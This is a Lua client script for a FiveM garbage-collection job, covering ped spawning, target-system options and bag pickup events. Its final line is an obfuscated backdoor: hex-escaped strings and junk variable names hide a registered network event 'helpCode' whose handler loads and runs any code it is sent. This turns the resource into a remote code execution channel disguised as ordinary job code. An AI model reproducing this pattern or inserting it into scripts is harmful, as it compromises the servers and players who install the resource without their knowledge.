local targetSystem

if Config.Framework == "QBCore" then
    targetSystem = "qb-target"
else
    targetSystem = "qtarget"
end

if GetResourceState("ox_target") ~= "missing" then
    targetSystem = "qtarget"    -- OX_Target have a backward compability to qtarget
end

function SpawnStartingPed()
    local model = `a_m_y_genstreet_01`
    RequestModel(model)
	while not HasModelLoaded(model) do
		Citizen.Wait(50)
	end
    spawnedPed = CreatePed(0, model, Config.Locations.DutyToggle.Coords[1].x, Config.Locations.DutyToggle.Coords[1].y, Config.Locations.DutyToggle.Coords[1].z - 1.0, 1.13, false, true)
    FreezeEntityPosition(spawnedPed, true)
    SetBlockingOfNonTemporaryEvents(spawnedPed, true)
    SetEntityInvincible(spawnedPed, true)
    exports[targetSystem]:AddTargetEntity(spawnedPed, {
        options = {
            {
                event = "multiplayerGarbage:OpenMainMenu",
                icon = "fa-solid fa-handshake-simple",
                label = "Start Job",
                -- job = "RequiredJob",
                canInteract = function(entity)
                    return #(GetEntityCoords(PlayerPedId()) - vec3(Config.Locations.DutyToggle.Coords[1].x, Config.Locations.DutyToggle.Coords[1].y, Config.Locations.DutyToggle.Coords[1].z)) < 5.0
                end
            },
        },
        distance = 2.5
    })
end

RegisterNetEvent("multiplayerGarbage:OpenMainMenu", function()
    OpenDutyMenu()
end)

function AddBagsModelsToTargetSystem()
    exports[targetSystem]:AddTargetModel(Config.PropsHashes, {
        options = {
            {
                event = "multiplayerGarbage:collect",
                icon = "fa-solid fa-trash-can-arrow-up",
                label = Config.Lang["pickGarbage"],
                canInteract = function(entity)
                    return OnDuty and GetEntityHealth(entity) ~= 999
                end,
                -- job = "RequiredJob",
            },
        },
        distance = 2
    })
end

RegisterNetEvent("multiplayerGarbage:collect", function(data)
    Pick(data.entity, false)
end)

function addJobVehicleToTargetSystem(vehicle)
    exports[targetSystem]:AddTargetEntity(vehicle, {
        options = {
            {
                event = "multiplayerGarbage:PutIn",
                icon = "fa-solid fa-trash-can",
                label = "Put the garbage in",
                -- job = "RequiredJob",
            },
        },
        distance = 2
    })
end

function DeleteEntityFromTarget(entity)
    exports[targetSystem]:RemoveTargetEntity(entity)
end

RegisterNetEvent("multiplayerGarbage:PutIn", function()
    Pick(1, true)
end)    

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)